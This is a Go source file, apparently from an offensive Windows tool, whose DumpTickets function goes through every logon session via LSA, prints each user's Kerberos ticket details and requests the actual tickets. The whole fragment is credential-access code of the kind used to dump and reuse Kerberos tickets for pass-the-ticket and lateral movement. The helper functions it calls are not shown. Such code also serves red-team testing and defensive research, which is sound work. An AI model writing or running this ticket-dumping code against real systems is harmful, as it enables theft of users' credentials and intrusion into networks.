package lsa

import (
	"fmt"
	"os"
	"syscall"
)

func DumpTickets(lsaHandle syscall.Handle, authPack int) {
	// enumerate logon sessions
	luids, err := GetLogonSessions()
	if err != nil {
		fmt.Println("[ERROR] GetLogonSessions:", err)
		os.Exit(1)
	}
	fmt.Printf("[+] Found %d logon sessions\n", len(luids))
	for _, luid := range luids {
		// get info about the session
		sd, err := GetLogonSessionData(&luid)
		if err != nil {
			fmt.Println("[ERROR] LsaGetLogonSessionData:", err)
			os.Exit(1)
		}

		// get info about the ticket
		ticketInfos := GetTicketInfoExS(lsaHandle, authPack, luid, sd)

		if len(ticketInfos) > 0 {
			fmt.Println("##################################################")
			fmt.Println("Username:", sd.UserName)
			fmt.Println("SID:", sd.Sid)
			fmt.Println("Ticket Count:", len(ticketInfos))
			for _, tic := range ticketInfos {
				fmt.Println("------------------------------------------")
				fmt.Println("Client Name:", tic.ClientName)
				fmt.Println("Client Realm:", tic.ClientRealm)
				fmt.Println("Server Name:", tic.ServerName)
				fmt.Println("Server Realm:", tic.ServerRealm)
				fmt.Println("Start Time:", TimeFromUint64(uint64(tic.StartTime)))
				fmt.Println("End Time:", TimeFromUint64(uint64(tic.EndTime)))
				fmt.Println("Renew Time:", TimeFromUint64(uint64(tic.RenewTime)))

				// request the actual ticket
				GetTicket(lsaHandle, authPack, luid, sd, tic.ServerName)
			}
		}

	}
}
